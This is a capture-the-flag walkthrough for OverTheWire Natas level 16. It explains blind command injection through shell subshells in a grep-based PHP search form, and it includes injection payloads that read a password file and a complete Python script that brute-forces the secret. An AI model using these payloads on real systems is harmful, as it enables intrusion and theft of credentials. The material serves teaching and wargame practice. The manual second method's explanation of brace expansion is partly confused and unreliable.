# OverTheWire: Natas — Level 16 → Level 17

> **Vulnerability:** Blind Command Injection via Subshell                                                               
> **Skills:** Shell injection, blind side-channel inference, scripted brute-force                               
> **Difficulty:** Medium-Hard                                                      
> **Official Page:** [Natas Level 16](https://overthewire.org/wargames/natas/natas16.html)

---

## Access

- **URL:** `http://natas16.natas.labs.overthewire.org`
- **Username:** `natas16`
- **Password:** *obtain from previous level*

---

## Task

Find the password for `natas17` by exploiting a blind command injection vulnerability in the search form, using subshell injection to infer the password one character at a time.

---

## Vulnerability

This level demonstrates **blind command injection**. The application passes user-supplied input directly into a shell command (`grep`) without sanitising characters that carry special meaning in a shell context — specifically the `$( )` subshell construct. Because the `needle` parameter is embedded inside double quotes in the shell call, an attacker can inject a subshell expression that executes an arbitrary second command. The result of that inner command is substituted into the outer `grep` call before it runs, making the server execute code the developer never intended. The output is not directly visible to the attacker ("blind"), but the presence or absence of a known word in the response creates a detectable side-channel that can be used to extract secrets one bit at a time.

---

## Theory

### How the vulnerable page works

The page presents a single text input labelled "Search for words containing:" and returns all matching words from a dictionary file. The server-side PHP looks roughly like this:

```php
<?php
$key = "";

if (array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if ($key != "") {
    if (preg_match('/[;|&`\'"]/', $key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

Notice what the filter **does** block: semicolons, pipes, ampersands, backticks, single quotes, and double quotes. These are the most commonly blacklisted shell metacharacters.

Notice what it **does not** block: the dollar sign `$` and parentheses `(` `)`. This omission is fatal, because `$(command)` is a POSIX subshell — it tells the shell to run `command` first and substitute its output inline. The filter is a denylist, and denylists are almost always incomplete.

### The subshell injection mechanism

When the server executes:

```bash
grep -i "$key" dictionary.txt
```

and `$key` is:

```
anythings$(grep ^a /etc/natas_webpass/natas17)
```

the shell first evaluates the inner subshell:

```bash
grep ^a /etc/natas_webpass/natas17
```

- If the password **starts with `a`**, the inner `grep` returns the full password string. That string gets spliced into the outer command, turning it into:

  ```bash
  grep -i "anythings<password>" dictionary.txt
  ```

  No dictionary word matches `anythings<password>`, so the response is **empty**.

- If the password **does not start with `a`**, the inner `grep` returns nothing. The outer command becomes:

  ```bash
  grep -i "anythings" dictionary.txt
  ```

  `anythings` exists in the dictionary, so the response contains the word **`anythings`**.

The presence or absence of the word `anythings` in the response is your oracle. This is the side-channel.

> **Why `anythings` specifically?** It only needs to be a real word in the dictionary that would not accidentally appear for other reasons. Any dictionary word that does not appear as a substring of the password would work. `anythings` is a common choice in Natas writeups.

### Tools and concepts

| Tool / Concept | Purpose |
|---|---|
| `grep ^X file` | Match lines starting with prefix `X` — used for progressive character discovery |
| `$( )` subshell | POSIX shell construct: executes a command and substitutes its stdout inline |
| `passthru()` in PHP | Executes a shell command and passes raw output directly to the browser |
| `preg_match` denylist | Server-side input filter — blocks some characters but not `$`, `(`, `)` |
| `requests` (Python) | HTTP library used to automate the injection and read responses |
| `requests.Session` | Reuses a TCP connection across many requests — faster than re-connecting each time |
| HTTP Basic Auth | `natas16` requires credentials on every request — passed via `auth=` in `requests` |

**Good to know — not directly used in the primary solution:**

| Concept | Notes |
|---|---|
| `expr substr str pos len` | Shell built-in: extracts a substring. Used in the manual method below. |
| `expr index str chars` | Shell built-in: finds the first occurrence of any char from `chars` in `str`. Used for case detection in the manual method. |
| Brace expansion `a{N}` | Shell: expands to `N` repetitions of `a` — used as a grep regex trick in the manual method. |

---

## Solution

### Method 1 — Automated blind injection (recommended)

**Step 1 — Log in and observe the page**

Navigate to `http://natas16.natas.labs.overthewire.org` and authenticate with `natas16` and the password from the previous level. You are presented with a dictionary search form.

> **What to notice:** The form has a single field called `needle`. Try searching for a common word like `password`. The server returns matching lines from a dictionary. This confirms that user input is passed directly to a `grep` command.

**Step 2 — View the page source to understand the filter**

In your browser, right-click and select "View Page Source," or press `Ctrl+U`. Find the PHP source embedded in the page (Natas levels often expose source inline).

```php
<?php
$key = "";

if (array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if ($key != "") {
    if (preg_match('/[;|&`\'"]/', $key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

> **What to notice:** The regex `/[;|&`\'"]/ ` blocks semicolons, pipes, ampersands, backticks, and quotes — but `$`, `(`, and `)` are not in the denylist. The input is embedded inside double quotes in the shell command, and double quotes do **not** prevent subshell expansion. This is the vulnerability.

**Step 3 — Verify the oracle manually**

Before automating anything, confirm the side-channel works by hand. In the search box, type:

```
anythings$(grep ^a /etc/natas_webpass/natas17)
```

Submit the form. Note whether `anythings` appears in the response or not. Try a character you are confident is not the first character of the password (e.g., `z`):

```
anythings$(grep ^z /etc/natas_webpass/natas17)
```

You should see different behaviour between the two attempts. When the inner `grep` matches, the output is empty. When it does not match, `anythings` is returned.

> **What to notice:** You have confirmed a working boolean oracle. Empty response = character is correct. Word returned = character is wrong.

**Step 4 — Write and run the automation script**

The script below (original logic credited to John Hammond) iterates over all printable alphanumeric characters, sends each payload, and uses the oracle to reconstruct the password character by character.

Create a file called `natas16.py` and paste the following:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Blind command injection — Natas Level 16
# Original approach credited to John Hammond

import requests
import time
from string import ascii_lowercase, ascii_uppercase, digits

characters = ascii_lowercase + ascii_uppercase + digits

username = 'natas16'
password = '<natas16_password>'          # replace with your actual password

url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()

seen_password = []

while len(seen_password) < 32:
    found = False
    for character in characters:
        attempt = ''.join(seen_password) + character
        payload = f'anythings$(grep ^{attempt} /etc/natas_webpass/natas17)'
        try:
            response = session.post(
                url,
                data={'needle': payload},
                auth=(username, password),
                timeout=10
            )
            content = response.text
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            time.sleep(1)
            continue

        if 'anythings' not in content:
            # Inner grep matched — this character is correct
            seen_password.append(character)
            print(f"[+] Found so far: {''.join(seen_password)}")
            found = True
            break

        time.sleep(0.1)

    if not found:
        print("[-] No matching character found. Something went wrong.")
        break

print(f"[+] Final password: {''.join(seen_password)}")
```

Run it:

```bash
python3 natas16.py
```

```
[+] Found so far: 8
[+] Found so far: 8P
[+] Found so far: 8Ps
[+] Found so far: 8Ps3
[+] Found so far: 8Ps3H
...
[+] Final password: <32-character password>
```

> **What to notice:** Each iteration sends up to 62 requests (26 lowercase + 26 uppercase + 10 digits) to confirm one character. For a 32-character password this is at most 1,984 requests. The `time.sleep(0.1)` between requests avoids hammering the server. The script stops as soon as a character matches, so average-case is roughly half that number of requests.

**Step 5 — Record the password**

Once the script prints the final 32-character string, copy it and use it to log in to `natas17`.

---

### Method 2 — Manual character-by-character extraction (alternative approach, no scripting)

This method uses shell arithmetic and string functions to extract individual characters from the password file without a Python script. It is slower and more involved, but demonstrates what is possible with shell primitives alone. It also handles case detection, which the automated script above handles naturally by including both uppercase and lowercase in its character set.

**Background: shell expressions used**

```bash
# Extract the Nth character (position N, length 1) from the password file:
$(expr substr $(cat /etc/natas_webpass/natas17) N 1)

# Find the position of a character C in a string S (returns an integer):
$(expr index "S" "C")

# Brace expansion used as a grep regex:
# a{2} matches "aa"; a{3} matches "aaa" — useful for encoding numeric values
a{$((expr_result))}
```

**Phase A — Determine whether a character is a letter or digit**

For position N, inject:

```
$(expr substr $(cat /etc/natas_webpass/natas17) N 1)
```

For example, to test position 1:

```
anythings$(expr substr $(cat /etc/natas_webpass/natas17) 1 1)
```

- If position 1 is a **letter**, the inner expression outputs that letter. The outer grep searches for `anythings<letter>` in the dictionary. No such compound word exists, so the response is **empty**.
- If position 1 is a **digit** (e.g., `8`), the inner expression outputs `8`. The outer grep searches for `anythings8` in the dictionary. No match exists either — so the response is also empty.

At this point the response alone does not distinguish a letter from a digit. Proceed to Phase B.

**Phase B — Determine the numeric value if the character is a digit**

Use shell arithmetic to encode the digit as a count of `a` characters, then use grep's repeat syntax as the oracle:

```
a{$(($(expr substr $(cat /etc/natas_webpass/natas17) N 1)-OFFSET))}
```

The trick: `a{2}` in grep matches the literal string `aa`. So if the character at position N is `8`, then `a{$((8-6))}` expands to `a{2}`, which grep interprets as `aa`. If `aa` is in the dictionary, the response is non-empty.

Adjust `OFFSET` from 0 upward until the response contains a match (i.e., until `a{$((digit - OFFSET))}` produces a count that corresponds to a real repeated-`a` word in the dictionary). The `OFFSET` value that produces a match tells you the digit: `digit = OFFSET + match_count`.

In practice: try offsets starting at 0. When the response returns `aa`, the digit equals `OFFSET + 2`. When it returns `aaa`, the digit equals `OFFSET + 3`, and so on.

> **What to notice:** This is indirect arithmetic. You are using the dictionary as a lookup table for integers by encoding them as repetition counts. It is clever but fragile — it depends on which repeated-`a` strings exist in the dictionary (`a`, `aa`, `aaa`, etc.).

**Phase C — Determine the case of a letter**

Once you know a character is a letter and which letter it is (case-insensitive), use `expr index` to determine case:

```
a{$(($(expr index $(expr substr $(grep -i WORD dictionary.txt) START LEN) CHAR)+0))}
```

Breaking this down with a worked example. Suppose position 21 of the password is either `G` or `g`. Choose a word from the dictionary that:
1. Has exactly one result when searched (uncommon enough to be unique)
2. Contains either `G` or `g` at a known position

For example, `Englishing` (a real dictionary entry): the substring from position 2 of length 4 is `ngli`. The character `G` does not appear in `ngli`, but `g` does (lowercase). So:

- `$(expr index "ngli" "G")` returns `0` (not found)
- `$(expr index "ngli" "g")` returns `4` (found at position 4)

Inject:

```
a{$(($(expr index $(expr substr $(grep -i Englishing dictionary.txt) 2 4) G)+0))}
```

- If position 21 is uppercase `G`: `expr index` returns `0`. Brace expansion becomes `a{0}`, which grep treats as a literal `a{0}` — no match. Response is empty.
- If position 21 is lowercase `g`: `expr index` returns `4`. Brace expansion becomes `a{4}` = `aaaa`. If `aaaa` is in the dictionary, response is non-empty.

Swap between `G` and `g` (or the relevant letter pair) in the `expr index` argument to determine which case produces a match.

> **What to notice:** You need a different dictionary word for each letter of the alphabet — one that contains the lowercase version but not the uppercase version (or vice versa) at a known offset. This method is correct but requires careful setup per character. It is included here to show what blind injection can do without any tooling beyond the browser's address bar.

---

## Password for Next Level

```
[redacted — obtain by completing the steps above]
```

---

## Key Takeaways

- Denylist-based input filtering is structurally unreliable. Blacklisting common shell metacharacters (`; | & \` ' "`) while leaving `$`, `(`, and `)` unblocked is enough for a full subshell injection. The correct control is to avoid constructing shell commands from user input entirely — use parameterised library calls (`escapeshellarg`, `preg_match` allowlist, or purpose-built APIs) instead.
- Blind injection vulnerabilities do not require the attacker to see command output directly. A single boolean difference in the response — word present vs. word absent — is sufficient to extract arbitrary secrets one bit at a time, given enough requests. This is the same principle behind blind SQL injection.
- Automation collapses the cost of a theoretically tedious attack. What would take hours of manual trial-and-error becomes a script that runs in minutes. Any vulnerability that produces a detectable oracle can be exploited at scale.

---

## Common Mistakes

| Mistake | What Happens | Fix |
|---|---|---|
| Using a word that does not exist in the dictionary as the oracle anchor | The response is always empty regardless of whether the inner grep matches, making the oracle unreliable | Verify first that the anchor word (e.g., `anythings`) appears in the dictionary by searching for it alone before injecting |
| Forgetting that `grep ^` is case-sensitive by default | The script misses uppercase characters, looping forever or producing a wrong partial password | The `-i` flag is not appropriate here because you need case-sensitive matching to distinguish `a` from `A`. Ensure the character set includes both cases and that the injected `grep` does not use `-i` |
| Including uppercase or special characters in the needle that break the URL or POST body encoding | Requests fail silently or return unexpected results | Use `requests` with a `data=` dict (form encoding) rather than manually constructing query strings; let the library handle encoding |
| Not rate-limiting requests | The server may start dropping connections or returning errors, corrupting the oracle | Add a small `time.sleep()` between requests (0.05–0.2 seconds is usually sufficient) |
| Stopping the script at the first character that produces no match without checking all candidates | The script incorrectly concludes the password is exhausted early | Ensure the "not found" branch is a true error state reached only after all 62 characters have been tried for a given position |
| Trying the manual method without first confirming which repeated-`a` words exist in the dictionary | The brace-expansion arithmetic trick fails silently if the target count has no matching dictionary entry | Run a preliminary search for `^a+$` (lines consisting only of `a` characters) to know which counts are available before building arithmetic payloads |
